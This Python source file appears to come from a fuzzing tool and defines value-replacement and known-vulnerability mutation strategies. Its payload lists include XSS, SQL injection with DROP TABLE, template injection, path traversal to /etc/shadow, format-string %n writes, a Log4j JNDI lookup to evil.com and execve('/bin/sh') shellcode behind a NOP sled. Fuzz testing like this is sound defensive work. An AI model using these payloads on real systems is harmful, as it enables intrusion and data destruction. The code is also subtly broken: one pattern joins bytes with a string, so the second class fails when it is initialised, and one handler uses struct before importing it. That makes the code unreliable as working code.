import random
from typing import List, Dict, Any

from .base import MutationStrategy


class ValueReplacementStrategy(MutationStrategy):
    """
    Value replacement strategy that substitutes values with known edge cases,
    interesting values, and potentially dangerous inputs.
    """

    def __init__(self):
        """Initialize the value replacement strategy."""
        super().__init__("Value Replacement")
        self.edge_cases = self._initialize_edge_cases()
        self.dangerous_values = self._initialize_dangerous_values()

    def _initialize_edge_cases(self) -> Dict[str, List[Any]]:
        """Initialize edge case values for different data types."""
        return {
            "numeric": [
                0,
                -1,
                1,
                2147483647,
                -2147483648,  # 32-bit integers
                4294967295,
                4294967296,  # 32-bit unsigned
                9223372036854775807,
                -9223372036854775808,  # 64-bit
                3.14159,
                -3.14159,
                0.0,
                -0.0,  # Floats
                float("inf"),
                float("-inf"),
                float("nan"),  # Special floats
                255,
                256,
                65535,
                65536,  # Common boundary values
            ],
            "string": [
                "",  # Empty string
                " ",  # Single space
                "\t",
                "\n",
                "\r",
                "\v",
                "\f",  # Control characters
                "\x00",  # Null byte
                "NULL",
                "null",
                "None",
                "undefined",  # Null-like values
                "true",
                "false",
                "yes",
                "no",
                "on",
                "off",  # Boolean strings
                "0",
                "-1",
                "1",
                "2147483647",  # Numeric strings
                "A" * 100,
                "A" * 1000,
                "A" * 10000,  # Long strings
                "🚀🔥💯🎯",  # Unicode/emoji
                "café résumé naïve",  # Accented characters
            ],
            "path": [
                "/",
                ".",
                "..",
                "../..",
                "../../..",  # Path traversal
                "/etc/passwd",
                "/etc/shadow",
                "/etc/hosts",  # System files
                "C:\\Windows\\System32",
                "C:\\boot.ini",  # Windows paths
                "/dev/null",
                "/dev/zero",
                "/dev/random",  # Unix devices
                "../../../etc/passwd\x00",  # Null-terminated path traversal
            ],
            "format": [
                "%s",
                "%d",
                "%x",
                "%n",  # Format strings
                "%s%s%s%s",
                "%d%d%d%d",
                "%x%x%x%x",
                "%n%n%n%n",  # Multiple format specifiers
                "%1000s",
                "%1000000s",  # Long format strings
                "%.1000s",
                "%.1000000s",  # Long precision specifiers
                "%08x",
                "%016x",  # Hex formats with padding
            ],
            "injection": [
                '<script>alert("xss")</script>',  # XSS
                '<img src=x onerror=alert("xss")>',  # XSS alternative
                "' OR '1'='1",
                '" OR "1"="1',  # SQL injection
                "'; DROP TABLE users; --",  # SQL injection with payload
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",  # Template injection
                "${jndi:ldap://evil.com/a}",  # Log4j
                "{{config}}",
                "{{self}}",  # Template injection variants
                "../admin/delete_all",  # Path-based injection
            ],
            "buffer": [
                "A" * 50,
                "A" * 100,
                "A" * 256,
                "A" * 512,  # Buffer overflow patterns
                "A" * 1024,
                "A" * 2048,
                "A" * 4096,
                "A" * 8192,
                "\x41" * 100,
                "\x90" * 100,
                "\x00" * 100,  # Hex patterns
                "AAAA\x41\x41\x41\x41",  # Pattern with marker
                "\x00" * 100,
                "\xff" * 100,  # Null/byte patterns
            ],
        }

    def _initialize_dangerous_values(self) -> List[bytes]:
        """Initialize dangerous byte sequences."""
        dangerous = [
            b"\x00\x00\x00\x00",  # Multiple nulls
            b"\xff\xff\xff\xff",  # All bits set
            b"\x7f\xff\xff\xff",  # Max 32-bit signed
            b"\x80\x00\x00\x00",  # Min 32-bit signed
            b"\x41\x41\x41\x41\x41\x41\x41\x41",  # Buffer overflow pattern
            b"../" * 20,  # Path traversal
            b"%s" * 50,  # Format string
            b"<" * 100 + b"script" + b">" * 100,  # XSS pattern
            b"' OR 1=1 --",  # SQL injection
            b"\x0a" * 100,
            b"\x0d" * 100,  # Newline/carriage return
            b"\x09" * 100,  # Tab characters
        ]
        return dangerous

    def apply(self, data: bytes) -> bytes:
        """
        Apply value replacement mutations.

        Args:
            data: Original input data

        Returns:
            Data with value replacements applied
        """
        if not data:
            return self._get_random_edge_case_bytes()

        mutation_type = random.choice(
            [
                "edge_case_replacement",
                "dangerous_injection",
                "string_replacement",
                "binary_pattern",
                "null_injection",
            ]
        )

        if mutation_type == "edge_case_replacement":
            return self._replace_with_edge_case(data)
        elif mutation_type == "dangerous_injection":
            return self._inject_dangerous_value(data)
        elif mutation_type == "string_replacement":
            return self._replace_string_content(data)
        elif mutation_type == "binary_pattern":
            return self._replace_with_binary_pattern(data)
        else:  # null_injection
            return self._inject_null_bytes(data)

    def _replace_with_edge_case(self, data: bytes) -> bytes:
        """Replace portions of data with edge case values."""
        try:
            # Try to interpret as text
            text_data = data.decode("utf-8", errors="ignore")

            if text_data.strip():
                # Looks like text, use string edge cases
                edge_case = random.choice(self.edge_cases["string"])
                replacement = edge_case.encode("utf-8")
            else:
                # Binary data, use numeric edge cases
                edge_case = random.choice(self.edge_cases["numeric"])
                if isinstance(edge_case, float):
                    import struct

                    replacement = struct.pack("<d", edge_case)
                else:
                    replacement = edge_case.to_bytes(8, "little", signed=True)

            # Replace a random portion
            if len(data) > len(replacement):
                start = random.randint(0, len(data) - len(replacement))
                result = bytearray(data)
                result[start : start + len(replacement)] = replacement
                return bytes(result)
            else:
                return replacement

        except (UnicodeDecodeError, struct.error):
            return self._get_random_edge_case_bytes()

    def _inject_dangerous_value(self, data: bytes) -> bytes:
        """Inject dangerous values into the data."""
        dangerous_value = random.choice(self.dangerous_values)

        if random.random() < 0.5:
            # Insert at random position
            if data:
                insert_pos = random.randint(0, len(data))
                result = bytearray(data)
                result[insert_pos:insert_pos] = dangerous_value
                return bytes(result)
            else:
                return dangerous_value
        else:
            # Append or prepend
            if random.random() < 0.5:
                return data + dangerous_value
            else:
                return dangerous_value + data

    def _replace_string_content(self, data: bytes) -> bytes:
        """Replace string content with test values."""
        try:
            text_data = data.decode("utf-8", errors="ignore")

            # Try to find words/strings to replace
            words = text_data.split()
            if words:
                # Replace a random word
                word_to_replace = random.choice(words)
                replacement_type = random.choice(
                    ["format", "injection", "path", "buffer"]
                )
                replacement = random.choice(self.edge_cases[replacement_type])

                if isinstance(replacement, str):
                    replacement = replacement.encode("utf-8")
                else:
                    replacement = str(replacement).encode("utf-8")

                # Replace first occurrence
                word_bytes = word_to_replace.encode("utf-8")
                result = bytearray(data)
                pos = result.find(word_bytes)
                if pos != -1:
                    result[pos : pos + len(word_bytes)] = replacement
                    return bytes(result)

            # Fallback: just inject a value
            return self._inject_dangerous_value(data)

        except UnicodeDecodeError:
            return self._inject_dangerous_value(data)

    def _replace_with_binary_pattern(self, data: bytes) -> bytes:
        """Replace data with interesting binary patterns."""
        patterns = [
            b"\x00" * 50,  # Null bytes
            b"\xff" * 50,  # All bits set
            b"\x41" * 50,  # 'A' characters
            b"\x90" * 50,  # NOP sled
            b"\x00\x01\x02\x03\x04\x05\x06\x07" * 10,  # Sequential pattern
            b"\xff\xfe\xfd\xfc\xfb\xfa\xf9\xf8" * 10,  # Reverse sequential
            b"\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa" * 10,  # Repeated pattern
            b"\x55\x55\x55\x55\x55\x55\x55\x55" * 10,  # Alternating pattern
        ]

        pattern = random.choice(patterns)

        if len(data) > len(pattern):
            start = random.randint(0, len(data) - len(pattern))
            result = bytearray(data)
            result[start : start + len(pattern)] = pattern
            return bytes(result)
        else:
            return pattern

    def _inject_null_bytes(self, data: bytes) -> bytes:
        """Inject null bytes at strategic positions."""
        null_count = random.randint(1, 20)
        null_bytes = b"\x00" * null_count

        if random.random() < 0.7:
            # Insert at random position
            if data:
                insert_pos = random.randint(0, len(data))
                result = bytearray(data)
                result[insert_pos:insert_pos] = null_bytes
                return bytes(result)
            else:
                return null_bytes
        else:
            # Add to beginning or end
            if random.random() < 0.5:
                return null_bytes + data
            else:
                return data + null_bytes

    def _get_random_edge_case_bytes(self) -> bytes:
        """Get a random edge case as bytes."""
        category = random.choice(list(self.edge_cases.keys()))
        value = random.choice(self.edge_cases[category])

        if isinstance(value, str):
            return value.encode("utf-8")
        elif isinstance(value, (int, float)):
            if isinstance(value, float):
                import struct

                return struct.pack("<d", value)
            else:
                return value.to_bytes(8, "little", signed=True)
        else:
            return (
                bytes(value)
                if isinstance(value, (bytes, bytearray))
                else str(value).encode("utf-8")
            )

    def get_description(self) -> str:
        """Get a description of the value replacement strategy."""
        return "Replaces values with edge cases, dangerous inputs, and interesting patterns"

    def get_effectiveness_score(self) -> float:
        """Very effective for finding injection and boundary-related vulnerabilities."""
        return 0.85

    def get_complexity_score(self) -> float:
        """Moderate complexity due to various value types."""
        return 0.4


class KnownVulnerabilityStrategy(MutationStrategy):
    """
    Strategy that uses patterns from known vulnerabilities and exploits.
    """

    def __init__(self):
        """Initialize the known vulnerability strategy."""
        super().__init__("Known Vulnerability")
        self.vulnerability_patterns = self._initialize_vulnerability_patterns()

    def _initialize_vulnerability_patterns(self) -> Dict[str, List[bytes]]:
        """Initialize patterns from known vulnerabilities."""
        return {
            "buffer_overflow": [
                b"A" * 256,  # Classic stack overflow
                b"A" * 1024,  # Large overflow
                b"\x41\x41\x41\x41" * 100,  # Patterned overflow
                b"\x90" * 100
                + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",  # Shellcode pattern
                b"\x00" * 100 + b"A" * 100,  # Null + overflow
            ],
            "format_string": [
                b"%s%x%x%x%x%x%x%x%x%x%x%n",  # Write format string
                b"AAAA" + b"%08x" * 20,  # Read format string
                b"%1000x" + b"%hn",  # Large format string
                b"%" + str(0x41414141) + "x" + b"%n",  # Direct write
            ],
            "integer_overflow": [
                b"\xff" * 4,  # Max unsigned int
                b"\x7f\xff\xff\xff",  # Max signed int
                b"\x80\x00\x00\x00",  # Min signed int
                b"\xff\xff\xff\xff",  # -1 as unsigned
            ],
            "heap_corruption": [
                b"A" * 8 + b"B" * 8 + b"C" * 8,  # Heap metadata pattern
                b"\x00" * 8 + b"\xff" * 8 + b"\x00" * 8,  # Corruption pattern
                b"A" * 16 + b"B" * 4 + b"C" * 4,  # Size field corruption
            ],
            "race_condition": [
                b"A" * 1000,  # Large input for timing attacks
                b"\x00" * 10000,  # Large null input
                b"A" * 50000,  # Very large input
            ],
            "web_vulnerabilities": [
                b"<script>alert(1)</script>",  # XSS
                b"><script>alert(1)</script>",  # XSS variant
                b"<img src=x onerror=alert(1)>",  # XSS alternative
                b"'+alert(1)+'",  # XSS in quotes
                b"{{7*7}}",  # Template injection
                b"${7*7}",  # Template injection variant
                b"' OR '1'='1",  # SQL injection
                b"' UNION SELECT NULL--",  # SQL injection variant
                b"../../../etc/passwd\x00",  # Path traversal with null
                b"../../windows/win.ini",  # Windows path traversal
            ],
            "protocol_vulnerabilities": [
                b"GET / HTTP/1.1\r\n" + b"A" * 1000,  # HTTP header overflow
                b"A" * 1000 + b"\r\n\r\n",  # Long request line
                b"User-Agent: " + b"A" * 10000,  # Long header
                b"Content-Length: " + b"9" * 100,  # Invalid length
            ],
        }

    def apply(self, data: bytes) -> bytes:
        """
        Apply known vulnerability patterns.

        Args:
            data: Original input data

        Returns:
            Data with vulnerability patterns applied
        """
        vulnerability_type = random.choice(list(self.vulnerability_patterns.keys()))
        patterns = self.vulnerability_patterns[vulnerability_type]
        pattern = random.choice(patterns)

        mutation_method = random.choice(["replace", "prepend", "append", "inject"])

        if mutation_method == "replace":
            # Replace entire content
            return pattern
        elif mutation_method == "prepend":
            return pattern + data
        elif mutation_method == "append":
            return data + pattern
        else:  # inject
            if data and len(data) > len(pattern):
                insert_pos = random.randint(0, len(data) - len(pattern))
                result = bytearray(data)
                result[insert_pos : insert_pos + len(pattern)] = pattern
                return bytes(result)
            else:
                return pattern

    def get_description(self) -> str:
        """Get a description of the known vulnerability strategy."""
        return "Applies patterns from known vulnerabilities and exploits"

    def get_effectiveness_score(self) -> float:
        """Very effective when target has similar vulnerabilities."""
        return 0.9

    def get_complexity_score(self) -> float:
        """Low complexity, just applying pre-defined patterns."""
        return 0.2
